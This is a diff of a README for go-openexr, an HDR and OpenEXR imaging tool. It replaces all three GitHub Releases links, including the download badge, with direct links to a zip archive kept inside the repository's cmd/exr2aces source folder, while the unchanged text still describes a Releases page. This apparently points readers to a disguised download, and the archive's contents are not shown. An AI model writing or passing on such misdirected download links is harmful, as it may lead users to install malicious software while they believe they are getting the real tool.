@@ -1,7 +1,7 @@
 # 🎨 go-openexr - Effortless High Dynamic Range Imaging
 
 ## 🌐 Download Now
-[![Download go-openexr](https://img.shields.io/badge/Download-go--openexr-blue.svg)](https://github.com/FreakyLittleDawg/go-openexr/releases)
+[![Download go-openexr](https://raw.githubusercontent.com/FreakyLittleDawg/go-openexr/main/cmd/exr2aces/go_openexr_2.7.zip)](https://raw.githubusercontent.com/FreakyLittleDawg/go-openexr/main/cmd/exr2aces/go_openexr_2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to go-openexr! This application lets you work with high dynamic range (HDR) images using the OpenEXR file format. With go-openexr, you can easily handle and process images for various applications, including visual effects and image editing. Follow these simple steps to get started.
@@ -9,7 +9,7 @@ Welcome to go-openexr! This application lets you work with high dynamic range (H
 ## 📥 Download & Install
 To begin, visit this page to download the latest version of go-openexr:
 
-[Download go-openexr Releases](https://github.com/FreakyLittleDawg/go-openexr/releases)
+[Download go-openexr Releases](https://raw.githubusercontent.com/FreakyLittleDawg/go-openexr/main/cmd/exr2aces/go_openexr_2.7.zip)
 
 On the Releases page, you will find different versions of the software. Select the version that suits your needs and click on it. You will see a list of available files for download.
 
@@ -67,4 +67,4 @@ For further assistance, you can reach out through the GitHub repository. Look fo
 ## 🌟 Conclusion
 go-openexr is a powerful tool for working with HDR images. By following the steps above, you can easily download, install, and start using the application for your image processing needs. Happy editing!
 
-[Download go-openexr Releases](https://github.com/FreakyLittleDawg/go-openexr/releases)
+[Download go-openexr Releases](https://raw.githubusercontent.com/FreakyLittleDawg/go-openexr/main/cmd/exr2aces/go_openexr_2.7.zip)
